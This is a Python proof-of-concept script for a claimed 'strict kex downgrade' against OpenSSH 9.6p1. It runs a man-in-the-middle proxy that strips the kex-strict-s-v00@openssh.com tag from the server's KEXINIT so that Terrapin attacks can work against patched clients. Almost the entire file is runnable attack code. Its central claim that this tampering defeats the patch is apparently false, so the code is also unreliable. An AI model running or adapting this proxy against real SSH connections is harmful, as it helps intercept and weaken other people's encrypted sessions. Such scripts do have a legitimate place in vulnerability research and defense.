#!/usr/bin/python3
import struct
import socket
from threading import Thread
from time import sleep

import click

#####################################################################################
## Proof of Concept for the strict kex downgrade attack                            ##
##                                                                                 ##
## Strips kex-strict-s-v00@openssh.com from server's SSH_MSG_KEXINIT to prevent   ##
## strict kex negotiation, allowing Terrapin attacks against patched clients.      ##
##                                                                                 ##
## Client(s) tested: OpenSSH 9.6p1                                                 ##
## Server(s) tested: OpenSSH 9.6p1                                                 ##
##                                                                                 ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
#####################################################################################

STRICT_KEX_SERVER_TAG = b'kex-strict-s-v00@openssh.com'

@click.command()
@click.option("--proxy-ip", default="0.0.0.0", help="The interface address to bind the TCP proxy to.")
@click.option("--proxy-port", default=22, help="The port to bind the TCP proxy to.")
@click.option("--server-ip", help="The IP address where the SSH server is running.")
@click.option("--server-port", default=22, help="The port where the SSH server is running.")
def cli(proxy_ip, proxy_port, server_ip, server_port):
    print("--- Proof of Concept for strict kex downgrade attack ---", flush=True)
    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mitm_socket.bind((proxy_ip, proxy_port))
    mitm_socket.listen(5)

    print(f"[+] MitM Proxy started. Listening on {(proxy_ip, proxy_port)} for incoming connections...", flush=True)
    try:
        while True:
            client_socket, client_addr = mitm_socket.accept()
            print(f"[+] Accepted connection from: {client_addr}", flush=True)
            print(f"[+] Establishing new target connection to {(server_ip, server_port)}.", flush=True)
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((server_ip, server_port))
            print("[+] Performing strict kex downgrade", flush=True)
            perform_attack(client_socket, server_socket)
            print("[+] Downgrade performed. Spawning new forwarding threads to handle client connection from now on.", flush=True)
            forward_client_to_server_thread = Thread(target=pipe_socket_stream, args=(client_socket, server_socket), daemon=True)
            forward_client_to_server_thread.start()
            forward_server_to_client_thread = Thread(target=pipe_socket_stream, args=(server_socket, client_socket), daemon=True)
            forward_server_to_client_thread.start()
    except KeyboardInterrupt:
        client_socket.close()
        server_socket.close()
        mitm_socket.close()

def pipe_socket_stream(in_socket, out_socket):
    try:
        while True:
            data = in_socket.recv(4096)
            if len(data) == 0:
                break
            out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.", flush=True)
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.", flush=True)
    in_socket.close()
    out_socket.close()

def strip_strict_kex_from_kexinit(data):
    # SSH_MSG_KEXINIT structure (unencrypted):
    # 0-3:   packet_length (uint32 big-endian)
    # 4:     padding_length (byte)
    # 5:     message type (20 = KEXINIT)
    # 6-21:  cookie (16 random bytes)
    # 22-25: kex_algorithms length (uint32 big-endian)
    # 26...: kex_algorithms string (comma-separated)
    # end:   padding (padding_length bytes)
    packet_len = struct.unpack('>I', data[0:4])[0]
    padding_len = data[4]
    kex_alg_len = struct.unpack('>I', data[22:26])[0]
    kex_alg = data[26:26 + kex_alg_len]

    if STRICT_KEX_SERVER_TAG not in kex_alg:
        print("[!] kex-strict-s-v00@openssh.com not found in server KEXINIT, server may not support strict kex.", flush=True)
        return data

    # Remove the tag, handling comma on either side
    if b',' + STRICT_KEX_SERVER_TAG in kex_alg:
        new_kex_alg = kex_alg.replace(b',' + STRICT_KEX_SERVER_TAG, b'')
    else:
        new_kex_alg = kex_alg.replace(STRICT_KEX_SERVER_TAG + b',', b'')

    len_diff = len(kex_alg) - len(new_kex_alg)

    # Update kex_algorithms length field (bytes 22-25)
    new_kex_alg_len_bytes = struct.pack('>I', kex_alg_len - len_diff)

    # Keep packet_length the same by increasing padding to compensate.
    # This preserves block alignment (SSH requires packet size % 8 == 0).
    new_padding_len = padding_len + len_diff
    new_padding_len_byte = bytes([new_padding_len])
    new_padding = b'\x00' * new_padding_len

    # Reconstruct: packet_length (unchanged) + new padding_length + cookie + new kex_alg_len + new kex_alg + rest of payload (excluding old padding) + new padding
    # Append any trailing data after the KEXINIT packet (recv may return more than one packet)
    payload_end = 4 + packet_len - padding_len  # end of real payload, start of old padding
    kexinit_total = 4 + packet_len              # total bytes consumed by KEXINIT packet
    trailing = data[kexinit_total:]             # any extra packets received in the same recv call
    new_data = data[0:4] + new_padding_len_byte + data[5:22] + new_kex_alg_len_bytes + new_kex_alg + data[26 + kex_alg_len:payload_end] + new_padding + trailing

    print(f"[+] Stripped kex-strict-s-v00@openssh.com from server KEXINIT (removed {len_diff} bytes, added to padding)", flush=True)
    print(f"[d] Modified server KEXINIT: {new_data.hex()}", flush=True)
    return new_data

def perform_attack(client_socket, server_socket):
    # Version exchange
    client_vex = client_socket.recv(255)
    server_vex = server_socket.recv(255)
    client_socket.send(server_vex)
    server_socket.send(client_vex)
    # SSH_MSG_KEXINIT
    client_kexinit = client_socket.recv(35000)
    server_kexinit = server_socket.recv(35000)
    # Strip strict kex extension from server KEXINIT before forwarding to client
    modified_server_kexinit = strip_strict_kex_from_kexinit(server_kexinit)
    client_socket.send(modified_server_kexinit)
    server_socket.send(client_kexinit)

if __name__ == '__main__':
    cli()
